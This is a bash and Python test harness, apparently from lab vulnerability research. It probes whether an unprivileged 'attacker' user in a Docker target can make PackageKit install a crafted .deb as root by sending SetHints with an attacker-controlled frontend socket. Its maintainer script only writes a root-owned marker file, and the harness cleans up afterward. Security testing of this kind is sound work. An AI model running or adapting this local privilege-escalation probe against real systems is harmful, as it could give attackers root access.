#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${TARGET:-ubuntu24-server-lpe-target}"
ATTACKER="${ATTACKER:-attacker}"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/packagekit-sethints-running.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

run() {
  printf '\n$'
  printf ' %q' "$@"
  printf '\n'
  "$@"
}

run_in_target() {
  run docker exec "$TARGET" bash -lc "$1"
}

echo "PackageKit SetHints running-transaction probe"
echo "target=$TARGET attacker=$ATTACKER"
date '+%Y-%m-%dT%H:%M:%S%z'

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

run_in_target '
set -euo pipefail
echo "== baseline =="
cat /etc/os-release | sed -n "1,6p"
uname -a
id attacker
id selfauth || true
dpkg-query -W -f="\${Package}\t\${Version}\t\${Status}\n" \
  packagekit packagekit-tools libpackagekit-glib2-18 gir1.2-packagekitglib-1.0 \
  python3-gi polkitd dbus systemd apt debconf 2>&1 || true
echo
echo "== packagekit service =="
systemctl cat packagekit.service
systemctl status packagekit.service --no-pager || true
echo
echo "== packagekit policy =="
grep -A4 -E "package-install|system-sources-refresh|trigger-offline-update" \
  /usr/share/polkit-1/actions/org.freedesktop.packagekit.policy || true
echo
echo "== cleanup before =="
systemctl restart packagekit.service || true
dpkg -r packagekit-sethints-running-root 2>/dev/null || true
rm -rf /tmp/packagekit-sethints-running /root/packagekit_sethints_running_root
'

run docker exec -i "$TARGET" runuser -u "$ATTACKER" -- bash <<'BUILD'
set -Eeuo pipefail
work=/tmp/packagekit-sethints-running
pkg="$work/pkg"
deb="$work/packagekit-sethints-running-root.deb"
rm -rf "$work"
mkdir -p "$pkg/DEBIAN" "$pkg/usr/local/share/packagekit-sethints-running"
cat > "$pkg/DEBIAN/control" <<'EOF'
Package: packagekit-sethints-running-root
Version: 1.0
Section: misc
Priority: optional
Architecture: all
Maintainer: PackageKit Probe <root@example.invalid>
Description: PackageKit SetHints running transaction marker package
EOF
cat > "$pkg/DEBIAN/config" <<'EOF'
#!/bin/sh
set -eu
if command -v db_input >/dev/null 2>&1; then
  db_input low packagekit-sethints-running-root/question || true
  db_go || true
fi
exit 0
EOF
cat > "$pkg/DEBIAN/templates" <<'EOF'
Template: packagekit-sethints-running-root/question
Type: string
Default: default
Description: PackageKit SetHints probe question
 This template exists to make any real interactive debconf install use the
 PackageKit frontend socket if the backend reaches maintainer-script setup.
EOF
cat > "$pkg/DEBIAN/postinst" <<'EOF'
#!/bin/sh
set -eu
{
  echo "packagekit-sethints-running postinst ran"
  date -Is
  id
  echo "DEBIAN_FRONTEND=${DEBIAN_FRONTEND-}"
  echo "DEBCONF_PIPE=${DEBCONF_PIPE-}"
  echo "PACKAGEKIT_CALLER_UID=${PACKAGEKIT_CALLER_UID-}"
} > /root/packagekit_sethints_running_root
chmod 0600 /root/packagekit_sethints_running_root
exit 0
EOF
chmod 0755 "$pkg/DEBIAN/config" "$pkg/DEBIAN/postinst"
printf 'probe payload\n' > "$pkg/usr/local/share/packagekit-sethints-running/payload.txt"
dpkg-deb --build "$pkg" "$deb"
ls -l "$deb"
dpkg-deb -I "$deb"
BUILD

run docker exec -i "$TARGET" runuser -u "$ATTACKER" -- bash <<'PROBE'
set -Eeuo pipefail
cat > /tmp/packagekit-sethints-running/probe.py <<'PY'
#!/usr/bin/env python3
import os
import socket
import struct
import sys
import threading
import time

import gi
gi.require_version("Gio", "2.0")
from gi.repository import Gio, GLib

BUS = "org.freedesktop.PackageKit"
ROOT = "/org/freedesktop/PackageKit"
PK = "org.freedesktop.PackageKit"
TX = "org.freedesktop.PackageKit.Transaction"
PROPS = "org.freedesktop.DBus.Properties"
SIMULATE = 4
ONLY_DOWNLOAD = 8

deb = sys.argv[1]
work = os.path.dirname(deb)
conn = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)


class Listener:
    def __init__(self, label):
        self.label = label
        self.path = os.path.join(work, f"{label}.sock")
        self.events = []
        self.stop = threading.Event()
        try:
            os.unlink(self.path)
        except FileNotFoundError:
            pass
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.bind(self.path)
        os.chmod(self.path, 0o666)
        self.sock.listen(8)
        self.sock.settimeout(0.25)
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def _run(self):
        while not self.stop.is_set():
            try:
                client, _ = self.sock.accept()
            except socket.timeout:
                continue
            except OSError as exc:
                self.events.append(("accept_error", repr(exc)))
                break
            try:
                cred = client.getsockopt(socket.SOL_SOCKET, socket.SO_PEERCRED, struct.calcsize("3i"))
                pid, uid, gid = struct.unpack("3i", cred)
                self.events.append(("connect", pid, uid, gid))
                client.settimeout(0.25)
                try:
                    data = client.recv(4096)
                    self.events.append(("data", data[:120].hex()))
                except Exception as exc:
                    self.events.append(("recv_error", repr(exc)))
            finally:
                client.close()

    def close(self):
        self.stop.set()
        try:
            poke = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            poke.settimeout(0.05)
            poke.connect(self.path)
            poke.close()
        except Exception:
            pass
        try:
            self.sock.close()
        except Exception:
            pass
        self.thread.join(timeout=1.0)
        try:
            os.unlink(self.path)
        except FileNotFoundError:
            pass


def call(path, iface, method, params=None, timeout=10000):
    return conn.call_sync(BUS, path, iface, method, params, None, Gio.DBusCallFlags.NONE, timeout, None)


def call_async(path, iface, method, params, label, timeout=12000):
    def done(source, result, _label):
        try:
            source.call_finish(result)
            print(f"  async_reply {label}: ok", flush=True)
        except GLib.Error as exc:
            print(f"  async_reply {label}: {exc.message}", flush=True)

    conn.call(BUS, path, iface, method, params, None, Gio.DBusCallFlags.NONE, timeout, None, done, label)
    conn.flush_sync(None)


def create_tx():
    return call(ROOT, PK, "CreateTransaction").unpack()[0]


def set_hints(tx, hints, label):
    try:
        call(tx, TX, "SetHints", GLib.Variant("(as)", (hints,)), 5000)
        print(f"  SetHints {label}: ok {hints}", flush=True)
        return "ok"
    except GLib.Error as exc:
        print(f"  SetHints {label}: {exc.message}", flush=True)
        return exc.message


def props(tx):
    try:
        ret = call(tx, PROPS, "GetAll", GLib.Variant("(s)", (TX,)), 5000)
        raw = ret.unpack()[0]
        keys = ("Uid", "CallerActive", "Role", "Status", "TransactionFlags", "Interactive")
        picked = {k: raw[k] for k in keys if k in raw}
        print(f"  props={picked}", flush=True)
    except GLib.Error as exc:
        print(f"  props_error={exc.message}", flush=True)


def drain(seconds):
    loop = GLib.MainLoop()
    GLib.timeout_add(int(seconds * 1000), loop.quit)
    loop.run()


def scenario(label, flags, pre_hints, post_hints):
    print(f"== scenario {label} flags={flags} ==", flush=True)
    listener = Listener(label)
    try:
        tx = create_tx()
        print(f"  tx={tx}", flush=True)
        props(tx)
        base = [f"frontend-socket={listener.path}", "interactive=true"]
        if pre_hints:
            set_hints(tx, base, "pre")
        call_async(tx, TX, "InstallFiles", GLib.Variant("(tas)", (flags, [deb])), f"InstallFiles flags={flags}")
        if post_hints:
            time.sleep(0.05)
            set_hints(tx, base, "post-start")
        drain(5.0)
        props(tx)
    finally:
        listener.close()
        print(f"  listener_events={listener.events}", flush=True)


scenario("simulate-pre", SIMULATE, True, False)
scenario("only-download-pre", ONLY_DOWNLOAD, True, False)
scenario("only-download-post", ONLY_DOWNLOAD, False, True)

print("== scenario real-install-preauth-block ==", flush=True)
listener = Listener("real-pre")
try:
    tx = create_tx()
    print(f"  tx={tx}", flush=True)
    set_hints(tx, [f"frontend-socket={listener.path}", "interactive=true"], "pre")
    call_async(tx, TX, "InstallFiles", GLib.Variant("(tas)", (0, [deb])), "InstallFiles flags=0")
    drain(5.0)
finally:
    listener.close()
    print(f"  listener_events={listener.events}", flush=True)

print("== scenario second-action-blocked ==", flush=True)
tx = create_tx()
print(f"  tx={tx}", flush=True)
call_async(tx, TX, "InstallFiles", GLib.Variant("(tas)", (ONLY_DOWNLOAD, [deb])), "InstallFiles flags=8")
time.sleep(0.05)
try:
    call(tx, TX, "InstallFiles", GLib.Variant("(tas)", (0, [deb])), 5000)
    print("  second InstallFiles flags=0: UNEXPECTED_OK", flush=True)
except GLib.Error as exc:
    print(f"  second InstallFiles flags=0: {exc.message}", flush=True)
drain(4.0)
PY
chmod 0755 /tmp/packagekit-sethints-running/probe.py
/tmp/packagekit-sethints-running/probe.py /tmp/packagekit-sethints-running/packagekit-sethints-running-root.deb
PROBE

run_in_target '
set -euo pipefail
echo "== post-probe root/package state =="
if test -e /root/packagekit_sethints_running_root; then
  echo "ROOT_MARKER_PRESENT"
  cat /root/packagekit_sethints_running_root
else
  echo "ROOT_MARKER_ABSENT"
fi
dpkg-query -W -f="\${Package}\t\${Version}\t\${Status}\n" packagekit-sethints-running-root 2>&1 || true
echo
echo "== cleanup =="
dpkg -r packagekit-sethints-running-root 2>/dev/null || true
rm -rf /tmp/packagekit-sethints-running /root/packagekit_sethints_running_root
systemctl restart packagekit.service || true
systemctl is-system-running || true
systemctl --failed --no-legend || true
'
